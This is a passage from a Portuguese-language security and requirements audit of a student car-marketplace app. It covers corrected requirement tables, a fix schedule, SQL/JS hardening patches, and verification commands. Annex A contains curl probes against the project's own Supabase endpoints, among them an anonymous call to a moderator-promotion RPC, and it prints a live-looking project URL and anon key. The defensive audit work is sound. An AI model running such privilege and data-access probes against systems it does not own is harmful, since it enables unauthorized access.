| UC20 | Marcar como vendido | **Não implementado** | Nenhuma ocorrência de “vendido” | Remover do artigo |
| UC21 | Receber notificações | **Parcial / não funcional** | Só toasts efêmeros; sem tabela/entrega | Manter como limitação (o artigo já faz) |
| UC22 | Filtrar e ordenar | **Parcial** | Ordenação completa; filtros limitados | Ajustar RF02 |
| UC23 | Sair da conta | Implementado | `signOut` | Manter |
| UC24 | Compartilhar anúncio | **Não implementado** | Nenhuma ocorrência de share | Remover do artigo |
| UC25 | Formulário de contato | **Não implementado** | `MG-CONTATO` é estático, com `mailto:` | Remover do artigo ou implementar |

**Resumo:** 13 implementados, 7 parciais e 5 não implementados. O núcleo do produto — contas, anúncios, busca, favoritos, contato, moderação — está de pé; as lacunas se concentram em edição, categorias, vendido, compartilhamento, notificações persistentes e formulário de contato.

### 5.3 Matriz de requisitos

| RF | Descrição | Status | Observação |
|---|---|---|---|
| RF01 | Contas: cadastro, login, recuperação, perfil, senha, logout | Implementado | — |
| RF02 | Pesquisar/filtrar/ordenar por marca, modelo, ano, preço, km, combustível, câmbio, cor, localização | **Parcial** | Só marca, tipo, preço, estado, texto; ordenação completa |
| RF03 | Detalhes com fotos, especificações e vendedor | Implementado | — |
| RF04 | Favoritos | Implementado | — |
| RF05 | Contato por WhatsApp ou mensagem interna | Implementado | — |
| RF06 | Publicar, editar, excluir e gerenciar anúncios | **Parcial** | Sem editar |
| RF07 | Marcar como vendido e remover da listagem | **Não implementado** | — |
| RF08 | Denunciar com motivo | Implementado | — |
| RF09 | Administrar usuários: pesquisar, editar, suspender, reativar | **Parcial** | Sem editar dados |
| RF10 | Moderar com justificativa | **Parcial** | Sem justificativa persistida |
| RF11 | Gerenciar categorias | **Não implementado** | — |
| RF12 | Painel com estatísticas e relatórios | **Parcial** | Sem relatórios |
| RF13 | Perfil público do vendedor e anúncios ativos | Implementado | — |
| RF14 | Notificações | **Parcial / não funcional** | Só toast |
| RF15 | Compartilhar | **Não implementado** | — |
| RF16 | Formulário de contato | **Não implementado** | — |

---

## 6. Artigo × código: integridade acadêmica

### 6.1 As três variantes do `.docx`

| Arquivo | Imagens | Url do repo | “MGMOTORSBR” | Uso recomendado |
|---|---|---|---|---|
| `ArtigoMG_revisado_professor.docx` | 9 | Correta | 0 ocorrências | **Fonte canônica do texto** |
| `ArtigoMG_revisado_MGMOTORSBR.docx` | 11 | Correta | 18 ocorrências | Fonte do diagrama de casos de uso e logos Biopark |
| `ArtigoMG_revisado_modelo_biopark.docx` | 10 | Correta | Template institucional | **Fonte canônica do template** |

**Estratégia:** usar `professor` como texto, `modelo_biopark` como formatação institucional e importar de `MGMOTORSBR` apenas o diagrama de casos de uso e os logos. **Parar de editar três arquivos em paralelo** — é a principal causa de inconsistência.

### 6.2 Alegações do artigo que o código não sustenta

| Alegação no artigo | Onde aparece | Realidade no código | Correção sugerida |
|---|---|---|---|
| UC09 — editar anúncio | Quadro 3, Quadro 6, texto | Não existe | Marcar como “não implementado” ou “trabalho futuro” |
| UC15 — gerenciar categorias | Quadro 3, RF11 | Não existe CRUD | Remover a linha “Categorias de veículos: Sim” |
| UC20 — marcar como vendido | Quadro 3, RF07 | Não existe | Remover ou marcar “Não” |
| UC21 — notificações | Quadro 3, RF14, Quadro 6 | Só toasts | Já está como FAIL no Quadro 6; manter e reforçar |
| UC24 — compartilhar | Quadro 3, RF15 | Não existe | Remover |
| UC25 — formulário de contato | Quadro 3, RF16, Quadro 6 | Só `mailto:` | Remover ou implementar |
| Filtros estendidos (combustível, câmbio, cor, km) | Quadro 3, RF02 | Não existem | Marcar “Parcial” |
| RF06 — editar anúncio | Quadro 3 | Não existe | Marcar “Parcial” |
| RF09 — editar usuários | Texto | Só banir/desbanir | Marcar “Parcial” |
| RF10 — justificativa de moderação | Texto | Não persistida | Marcar “Parcial” |
| RF12 — relatórios | Texto | Sem relatórios | Marcar “Parcial” |
| RF15/RF16 | Quadro 3 | Não implementados | Remover |

### 6.3 Quadro 3 corrigido (coluna MGMOTORS)

| Dimensão | Artigo atual | Correção |
|---|---|---|
| Anúncios de veículos | Sim | **Sim** |
| Pesquisa por texto | Sim | **Sim** |
| Filtros (marca, modelo, ano, preço, localização) | Sim | **Parcial** (marca, preço, estado; ano/modelo não são filtros) |
| Filtros estendidos (combustível, câmbio, cor, km) | Sim | **Não** |
| Ordenação de resultados | Sim | **Sim** |
| Categorias de veículos | Sim | **Parcial** (existem no banco e no filtro de tipo; sem CRUD) |
| Detalhes do anúncio | Sim | **Sim** |
| Dados do anunciante | Sim | **Sim** |
| Contato com o vendedor | Sim | **Sim** |
| Contato por WhatsApp | Sim | **Sim** |
| Mensagem interna | Sim | **Sim** |
| Favoritos | Sim | **Sim** |
| Perfil público do vendedor | Sim | **Sim** |
| Cadastro/login/recuperação | Sim | **Sim** |
| Marcar como vendido | Sim | **Não** |
| Denunciar | Sim | **Sim** |
| Moderar anúncios | Sim | **Parcial** |
| Administrar usuários | Sim | **Parcial** |
| Gerenciar categorias | Sim | **Não** |
| Painel administrativo | Sim | **Parcial** |
| Notificações | Parcialmente implementado; não funcional | **Manter** (está correto) |
| Compartilhar | Sim | **Não** |
| Formulário de contato | Sim | **Não** |

### 6.4 Quadro 6 corrigido

O quadro atual agrupa vários UCs por linha e marca PASS mesmo quando um dos UCs do grupo não existe. A correção é separar os cenários e registrar o que foi realmente testado.

| Cenário | UCs | Resultado | Status correto |
|---|---|---|---|
| Cadastro, login e recuperação | UC01–UC03 | Fluxos concluídos | **PASS** |
| Pesquisa, filtros e ordenação | UC04, UC22 | Filtros limitados, ordenação OK | **PASS parcial** |
| Detalhes do anúncio | UC05 | OK | **PASS** |
| Publicação de anúncio | UC08 | OK | **PASS** |
| Exclusão e gerenciamento | UC10, UC11 | Exclusão OK; edição ausente; aba pausados inacessível | **PASS parcial** |
| Favoritos e perfil | UC06, UC19 | OK | **PASS** |
| Denúncia e moderação | UC12–UC14 | Denúncia OK; aprovação sem checagem de erro | **PASS parcial** |
| Administração de usuários | UC13, UC16 | Busca/banimento OK; sem edição/relatórios | **PASS parcial** |
| Contato e mensagens | UC07 | OK | **PASS** |
| Formulário de contato | UC25 | Não existe | **FAIL / não implementado** |
| Notificações | UC21 | Não entregues | **FAIL** (já correto) |
| Edição de anúncio | UC09 | Não existe | **FAIL / não implementado** |
| Marcar como vendido | UC20 | Não existe | **FAIL / não implementado** |
| Compartilhar | UC24 | Não existe | **FAIL / não implementado** |
| Categorias | UC15 | Sem CRUD | **FAIL parcial** |
| Responsividade/navegação | Todos | Verificado, mas sem registrar dispositivos | **PASS com ressalva** |

**Regra editorial:** nunca agrupar um UC implementado com um não implementado na mesma linha “PASS”. A banca lê a linha, não a nota de rodapé.

### 6.5 Figuras 4–8

| Figura | Conteúdo | Situação | Ação |
|---|---|---|---|
| Figura 4 | Tela inicial | Captura real | Manter |
| Figura 5 | Login | Captura real | Manter |
| Figura 6 | Busca, filtros e anúncios | Mockup/representação | Substituir por captura real do marketplace |
| Figura 7 | Moderação e atendimento | Mockup/representação | Substituir por captura real do devpanel + Chatling |
| Figura 8 | Detalhe e publicação | Mockup com cards “IMAGEM DO VEÍCULO” | Substituir por captura real de um anúncio publicado |

O texto atual diz “a Figura 5 representa autenticação” — a palavra “representa” entrega que não é captura. Se a figura for mockup, a legenda deve dizer “representação” e o texto deve explicar. Melhor: trocar por captura real. Com 4 anúncios ativos, dá para publicar um anúncio de teste com fotos e capturar tudo.

### 6.6 O que o artigo já faz bem

- Reconhece que notificações não funcionaram (UC21/FAIL).
- Delimita o escopo: sem pagamento, financiamento ou transferência de propriedade.
- Não afirma conformidade integral com LGPD.
- Posiciona o trabalho como protótipo acadêmico, não como produto comercial.
- Tem referências adequadas e pergunta de pesquisa clara.

Essas escolhas são defensáveis. O problema não é o artigo ser modesto; é ele ser **mais ambicioso do que o código** em uma dúzia de pontos. Corrigir as tabelas é mais rápido e mais seguro do que implementar tudo.

---

## 7. Plano de correção priorizado

### 7.1 Premissas

- Banca em novembro/2026 (data exata a confirmar).
- ~5 semanas úteis.
- Equipe pequena; nem toda tarefa terá o mesmo responsável.
- Produção preservada; mudanças de banco em janela controlada.
- Nenhuma funcionalidade nova antes de P0/P1 concluídos.

### 7.2 P0 — até 7 dias (segurança e integridade)

| # | Tarefa | Arquivo/ação | Esforço | Evidência de conclusão |
|---|---|---|---|---|
| P0.1 | Corrigir nomes `fc_upload`/`fg_upload` na migration | `20261020120000_security_hardening.sql` | 30 min | `grep` + bloco de validação |
| P0.2 | Aplicar migration em **staging** | `supabase db push` / SQL Editor | 1 h | 21/21 no script (staging) |
| P0.3 | Rodar script corrigido em staging | `rls-security-check.sh` | 1 h | Antes/depois anexados |
| P0.4 | Aplicar migration em produção após backup | Supabase | 1 h | 21/21 em produção |
| P0.5 | Remover e-mails de dev do frontend | `devpanel.html:273,325`, `configuracoes.html:245` | 30 min | Nenhum e-mail no HTML |
| P0.6 | Corrigir XSS de imagens | marketplace, inicio, conta, devpanel | 3 h | Teste com URL maliciosa |
| P0.7 | Corrigir canonicals e domínio oficial | 21 HTML + Vercel | 1 h | `curl` no domínio |
| P0.8 | Revisar Quadro 3 e Quadro 6 | `.docx` canônico | 4 h | Tabelas sem “Sim” falso |
| P0.9 | Substituir Figuras 6–8 por capturas reais | `.docx` | 3 h | Figuras sem mockup |
| P0.10 | **Não** rodar `[5]–[7]` em produção | Processo | — | Registro no README do teste |

**Critério de saída do P0:** produção com 21/21 no script (ou 17/4 documentado e explicado, se a aplicação não for possível), artigo sem alegação de UC inexistente, nenhum e-mail pessoal no HTML público.

### 7.3 P1 — dias 8 a 21 (demonstração e experiência)

| # | Tarefa | Arquivo | Esforço |
|---|---|---|---|
| P1.1 | Corrigir links de blog | `headerGlobal.js:35` | 30 min |
| P1.2 | Implementar `?categoria=` e `?anunciar=1` | `marketplace.html` | 2 h |
| P1.3 | Expor aba “Pausados” | `conta.html:67-69` | 1 h |
| P1.4 | Checar erro na aprovação | `devpanel.html:418` | 30 min |
| P1.5 | Estilizar `.toast` ou linkar `devpanel.css` | CSS | 1 h |
| P1.6 | Corrigir leituras de `usuarios` no chat/conta | `mensagens.html`, `conta.html` | 2 h |
| P1.7 | Debounce na busca | `marketplace.html:813` | 1 h |
| P1.8 | Fallback do `mgConfig.js` | `mgConfig.js` | 2 h |
| P1.9 | Modais acessíveis (foco, ESC, ARIA) | marketplace | 4 h |
| P1.10 | Guarda de `quilometragem` | `conta.html` | 30 min |
| P1.11 | Reduzir upload de chat ou criar bucket privado | `mensagens.html` | 4–8 h |
| P1.12 | Paginação/limite em `get_anuncios_marketplace` | SQL | 3 h |

**Critério de saída do P1:** roteiro de demo inteiro executável sem 404, sem modal que não abre, sem toast invisível, sem tela em branco por config.

### 7.4 P2 — dias 22 a 35 (robustez e acabamento)

| # | Tarefa | Esforço |
|---|---|---|
| P2.1 | Testes manuais roteirizados com evidências (data, navegador, resolução) | 4 h |
| P2.2 | Revisão de acessibilidade (contraste, labels, teclado) | 4 h |
| P2.3 | Reduzir N+1 no chat/conta | 4 h |
| P2.4 | Headers de segurança no `vercel.json` | 1 h |
| P2.5 | Documentar Chatling (versão, plano, base, retenção) | 2 h |
| P2.6 | Atualizar README com estado real | 2 h |
| P2.7 | Ensaio geral da banca com timer | 2 h |
| P2.8 | Plano B offline (prints/vídeo) | 2 h |

### 7.5 Cronograma sugerido

| Semana | Período | Foco | Entrega |
|---|---|---|---|
| 1 | 22–28/10 | P0 segurança + artigo | Migration aplicada, tabelas corrigidas |
| 2 | 29/10–04/11 | P1 bugs de demo | Roteiro de demo funcionando |
| 3 | 05–11/11 | P1 restante + figuras | Artigo com capturas reais |
| 4 | 12–18/11 | P2 + ensaio | Evidências e ensaio cronometrado |
| 5 | 19–25/11 | Buffer | Correções de última hora |

### 7.6 Definition of done

Uma tarefa só está concluída quando:

1. o código está no Git (commit descritivo);
2. foi testada no domínio oficial, não só localmente;
3. tem evidência (print, log, resposta HTTP ou vídeo);
4. não quebrou outro fluxo do roteiro de demo;
5. se alterou o artigo, a tabela correspondente foi revisada.

---

## 8. Patches recomendados

> **Atenção:** os trechos abaixo são propostas. Nenhum foi aplicado. Aplicar em branch separada, testar em staging e revisar antes de produção.

### 8.1 SQL — fechar as policies de storage

```sql
-- 1. Remover as policies permissivas reais (nomes corretos)
DROP POLICY IF EXISTS "fc_upload" ON storage.objects;
DROP POLICY IF EXISTS "fg_upload" ON storage.objects;

-- 2. Recriar com checagem de dono no caminho
--    Ajustar o índice de foldername se o path não começar pelo UID.
CREATE POLICY "fc_upload_dono" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (
    bucket_id = 'FOTOS-COMUNIDADE'
    AND (storage.foldername(name))[1] = (SELECT auth.uid())::text
  );

CREATE POLICY "fg_upload_dono" ON storage.objects
  FOR INSERT TO authenticated
  WITH CHECK (
    bucket_id = 'FOTOS-GARAGEM'
    AND (storage.foldername(name))[1] = (SELECT auth.uid())::text
  );

-- 3. Validar
DO $$
BEGIN
  IF EXISTS (
    SELECT 1 FROM pg_policies
    WHERE schemaname = 'storage' AND tablename = 'objects'
      AND policyname IN ('fc_upload', 'fg_upload')
  ) THEN
    RAISE EXCEPTION 'Policies permissivas ainda presentes.';
  END IF;
END
$$;
```

### 8.2 SQL — corrigir o oráculo de curtidas

```sql
-- Opção mínima: ignorar o parâmetro e usar o uid do chamador
CREATE OR REPLACE FUNCTION public.get_anuncios_marketplace(
  usuario_id_param uuid DEFAULT NULL
)
RETURNS TABLE (...)
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public', 'pg_temp'
AS $$
BEGIN
  RETURN QUERY
  SELECT
    ...,
    CASE
      WHEN auth.uid() IS NULL THEN FALSE
      ELSE EXISTS (
        SELECT 1 FROM public.curtidas_anuncio ca
        WHERE ca.anuncio_id = a.id
          AND ca.usuario_id = auth.uid()
      )
    END AS usuario_curtiu
  ...
  LIMIT 200;
END;
$$;
```

Se o frontend passa `usuario_id_param`, ele deixa de ser confiável. O correto é remover o parâmetro da assinatura e do chamador.

### 8.3 JS — escape de imagem

```js
import { supabaseUrl, supabaseKey, escapeHtml } from "../mgConfig.js";

function safeImg(url, fallback = "../imagens/image.webp") {
  if (!url) return fallback;
  try {
    const u = new URL(url, location.href);
    if (u.protocol !== "http:" && u.protocol !== "https:") return fallback;
    return escapeHtml(u.href);
  } catch {
    return fallback;
  }
}

// uso
`<img src="${safeImg(anuncio.foto_principal)}" alt="${escapeHtml(alt)}" ...>`
```

### 8.4 JS — parâmetros de URL no marketplace

```js
const urlParams = new URLSearchParams(location.search);

// abrir modal de publicação
if (urlParams.get("anunciar") === "1") {
  if (usuarioAtual) {
    document.getElementById("modal-add-car").style.display = "flex";
  } else {
    location.href = "../MG-LOGIN/login.html";
  }
}

// categoria da home
const categoria = urlParams.get("categoria");
const mapaCategoria = {
  esportivos: "carro",
  suv: "carro",
  sedan: "carro",
  conversivel: "carro",
  eletrico: "carro",
  importado: "carro",
  seminovo: "carro"
};
if (categoria && mapaCategoria[categoria]) {
  document.getElementById("filtro-tipo-veiculo").value = mapaCategoria[categoria];
  aplicarFiltroOrdenacao();
}
```

Observação: o mapeamento acima é um exemplo. Se “categoria” for uma tag de estilo e não o tipo de veículo, o filtro precisa de um campo próprio no banco. Não inventar semântica na demo.

### 8.5 JS — aba “Pausados”

```html
<!-- conta.html, junto das outras abas -->
<button class="tab-btn" data-tab="pausados">Pausados</button>
```

E garantir que o handler de `data-tab` já existente (`conta.html:587`) trate `pausados`. Se a intenção era não expor a aba, remover `#tab-pausados` e o código de `carregarPausados()`.

### 8.6 JS — aprovação com checagem de erro

```js
d.querySelector(".btn-aprovar").onclick = async () => {
  const { error } = await db.from("anuncios").update({ status: "ativo" }).eq("id", a.id);
  if (error) {
    toast("Erro ao aprovar: " + error.message);
    return;
  }
  toast("Anúncio aprovado!");
  d.remove();
  carregarDashboard();
};
```

### 8.7 CSS — toast visível

```css
.toast {
  position: fixed;
  right: 20px;
  bottom: 20px;
  z-index: 9999;
  background: #144b71;
  color: #fff;
  padding: 12px 18px;
  border-radius: 10px;
  font-weight: 700;
  box-shadow: 0 8px 24px rgba(0, 0, 0, .25);
  animation: toast-in .2s ease-out;
}
.toast.success { background: #1f7a3d; }
.toast.error   { background: #b3261e; }
.toast.warning { background: #a15c00; }
@keyframes toast-in {
  from { opacity: 0; transform: translateY(8px); }
  to   { opacity: 1; transform: translateY(0); }
}
```

### 8.8 JS — `mgConfig.js` com fallback

```js
let config;
try {
  const res = await fetch("/api/config");
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  config = await res.json();
} catch (e) {
  console.error("Falha ao carregar /api/config:", e);
  config = { supabaseUrl: "", supabaseKey: "" };
}

export const configError = !config.supabaseUrl || !config.supabaseKey;
export const supabaseUrl = config.supabaseUrl;
export const supabaseKey = config.supabaseKey;
```

E cada página deve exibir uma mensagem amigável se `configError` for `true`, em vez de tentar criar o client com strings vazias.

### 8.9 JS — links de blog

```js
// headerGlobal.js:35
<a href="/MG-DICAS/dicas.html" class="nav-link">Dicas</a>
```

Caminho absoluto funciona em qualquer profundidade quando o site é servido da raiz (Vercel). Se precisar funcionar em `file://`, calcular a profundidade com `import.meta.url` ou passar um prefixo por página.

### 8.10 JS — leituras de `usuarios_publicos`

```js
// mensagens.html / conta.html
const { data: perfil } = await supabase
  .from("usuarios_publicos")
  .select("id,nome,foto,cidade,estado")
  .eq("id", outroUsuarioId)
  .single();
```

Nunca usar `usuarios` para ler terceiros. A policy `usuarios select proprio ou admin` só permite o próprio registro ou admin.

### 8.11 Teste de RLS seguro

```bash
# NUNCA executar [5]-[7] contra produção.
# Usar projeto local ou staging descartável.
supabase start
export SUPABASE_URL="http://127.0.0.1:54321"
export SUPABASE_ANON_KEY="<anon key local>"
./supabase/tests/rls-security-check.sh
```

Para o teste autenticado, criar usuário descartável via Admin API e usar `trap` para removê-lo. Não usar conta real.

---

## 9. Checklist de evidências para a banca

### 9.1 Segurança

- [ ] Print do script antes: 17/4 (guardar como “estado inicial”).
- [ ] Print do script depois: 21/21.
- [ ] Registro da migration aplicada (data, ambiente, autor).
- [ ] Teste manual de XSS com URL maliciosa, mostrando que não executa.
- [ ] Print do storage com bucket privado e URL assinada (se implementado).

### 9.2 Funcional

- [ ] Roteiro de demo com 8–10 passos, cada um com print.
- [ ] Cadastro → login → publicar → buscar → filtrar → favoritar → mensagem → denunciar → moderar.
- [ ] Teste em pelo menos dois navegadores e duas resoluções.
- [ ] Vídeo de backup da demo (5–8 min), caso a internet falhe.

### 9.3 Artigo

- [ ] Quadro 3 corrigido (Sem “Sim” para UC inexistente).
- [ ] Quadro 6 corrigido (sem agrupar PASS com FAIL).
- [ ] Figuras 6–8 reais.
- [ ] Legenda de figura coerente com o conteúdo.
- [ ] Texto e tabelas sem “MGMOTORSBR” se a marca oficial for “MGMOTORS”.
- [ ] URL do repositório e do deploy conferidas.
- [ ] Versão final única (não três `.docx`).

### 9.4 Domínio

- [ ] `https://mgmotorss.vercel.app` abre o app.
- [ ] `/api/config` retorna JSON.
- [ ] Canonicals apontam para o domínio oficial.
- [ ] Domínio antigo redireciona ou está desativado.

---

## 10. O que não fazer

1. **Não rodar `[5]–[7]` do script contra produção.** Destrói perfil de usuário.
2. **Não aplicar migration sem backup e sem staging.** O bloco de pré-condições pode abortar; melhor descobrir antes.
3. **Não implementar UC09/UC15/UC20/UC21/UC24/UC25 em cima da hora.** O risco de regressão é maior que o ganho.
4. **Não editar os três `.docx` em paralelo.** Escolher um texto canônico e um template.
5. **Não usar mockup como se fosse captura.** Se for representação, dizer que é.
6. **Não divulgar o domínio antigo.** Ele serve outro aplicativo.
7. **Não adicionar e-mail de admin no HTML.** Usar `is_admin()`.
8. **Não prometer “LGPD compliant”.** Dizer “cuidados de proteção de dados”, como o texto do professor já faz.
9. **Não medir desempenho com 4 anúncios e chamar de benchmark.** Dizer “teste funcional em pequena escala”.
10. **Não deixar a migration fora do Git.** Sem histórico, não há evidência.

---

## 11. Riscos residuais e perguntas abertas

| Risco / pergunta | Impacto | Como resolver |
|---|---|---|
| Data exata da banca | Planejamento | Confirmar com a coordenação |
| A migration pode ser aplicada em produção sem downtime? | Médio | Testar em staging; janela de baixo uso |
| O bucket `FOTOS-COMUNIDADE` usa UID no primeiro segmento? | Médio | Inspecionar caminhos reais antes da policy |
| `config_usuario` aplica privacidade? | Médio | Ler policies e testar com dois usuários |
| Chatling: versão, plano, retenção | Alto para LGPD | Documentar ou remover da demo |
| E-mail de recuperação de senha está configurado? | Alto para UC03 | Testar com e-mail real |
| Há anúncios de teste com dados pessoais? | Médio | Limpar antes da demo |
| O artigo precisa de número mínimo de páginas? | Baixo | Verificar normas do evento/curso |
| A banca vai rodar o script de RLS? | Alto | Corrigir e deixar 21/21 |
| Quem é o responsável por cada correção? | Médio | Definir na primeira reunião |

---

## Anexo A — comandos de verificação

### A.1 Estado do repositório

```bash
cd /home/murilo/PROJETOS/MGMOTORS
git status --short
git log --oneline -5
find . -name '*.html' -not -path './.git/*' | wc -l
```

### A.2 Deploy

```bash
# app real
curl -s https://mgmotorss.vercel.app/api/config | head

# domínio antigo (deve ser desativado/redirecionado)
curl -s -o /dev/null -w '%{http_code}\n' https://mgmotors.vercel.app/api/config
```

### A.3 Teste de RLS (somente seções seguras)

```bash
export SUPABASE_URL="https://ilswwmjojfuvcgyymymb.supabase.co"
export SUPABASE_ANON_KEY="sb_publishable_0vy8zcMmKEd8oomSUQvJ4Q_SMpqFcxD"
# NÃO exportar AUTH_TOKEN/AUTH_UID: assim [5]-[7] são ignorados.
./supabase/tests/rls-security-check.sh
```

### A.4 Evidências dos quatro FAILs

```bash
# S1 — avaliações
curl -s "$SUPABASE_URL/rest/v1/avaliacoes?select=id,avaliador_id,avaliado_id,nota&limit=5" \
  -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY"

# S2 — fotos
curl -s -I "$SUPABASE_URL/rest/v1/fotos_anuncio?select=id&limit=1" \
  -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY" \
  -H "Prefer: count=exact"

# S3/S4 — RPCs
curl -s -o /dev/null -w '%{http_code}\n' -X POST "$SUPABASE_URL/rest/v1/rpc/promover_moderador" \
  -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" -d '{"p_email":"x@test.invalid"}'

curl -s -o /dev/null -w '%{http_code}\n' -X POST "$SUPABASE_URL/rest/v1/rpc/criar_tabela_carrinho" \
  -H "apikey: $SUPABASE_ANON_KEY" -H "Authorization: Bearer $SUPABASE_ANON_KEY" \
  -H "Content-Type: application/json" -d '{}'
```

### A.5 Busca de padrões perigosos

```bash
# XSS em src
grep -rn '\${.*foto.*}' --include='*.html' MG-* | head -30

# leitura direta de usuarios
grep -rn 'from("usuarios")' --include='*.html' .

# e-mails no frontend
grep -rn '@gmail.com\|@hotmail.com' --include='*.html' .

# canonicals
grep -rl 'mgmotors.vercel.app' --include='*.html' . | wc -l
```

---

## Anexo B — inventário resumido

| Área | Arquivos principais | Estado |
|---|---|---|
| Início | `MG-INICIO/inicio.html` | Funcional; links de categoria/anunciar ignorados |
| Marketplace | `MG-MARKETPLACE/marketplace.html` | Núcleo funcional; filtros limitados; XSS |
| Conta | `MG-CONTA/conta.html` | Perfil OK; aba pausados inacessível; XSS |
| Mensagens | `MG-MENSAGENS/mensagens.html` | Chat OK; nomes quebrados; bucket público |
| Login | `MG-LOGIN/login.html`, `register.html` | Funcional |
| Dev panel | `MG-DEV/devpanel.html` | Moderação OK; aprovação sem erro; e-mails expostos |
| Configurações | `MG-CONFIGURACOES/configuracoes.html` | E-mails de dev expostos |
| Contato | `MG-CONTATO/contato.html` | Estático; sem formulário |
| Dicas/Blog | `MG-DICAS/` | Conteúdo OK; nav quebrada em profundidade |
| Casos de uso | `MG-CASOS-USO/como-utilizar.html` | 25 UCs documentados |
| Banco | `supabase/migrations/` | Schema completo; hardening pendente |
| Testes | `supabase/tests/rls-security-check.sh` | Útil, mas destrutivo em [5]–[7] |
| Artigo | 3 `.docx` | Estrutura boa; overclaim em UCs |

---

**Conclusão:** o MGMOTORS é defensável. O que separa “projeto bom com ressalvas” de “projeto frágil na banca” é disciplina de escopo: corrigir segurança, consertar a demo e alinhar o artigo ao código. As cinco semanas disponíveis são suficientes para isso, desde que não sejam gastas implementando funcionalidades que o texto pode simplesmente deixar de prometer.
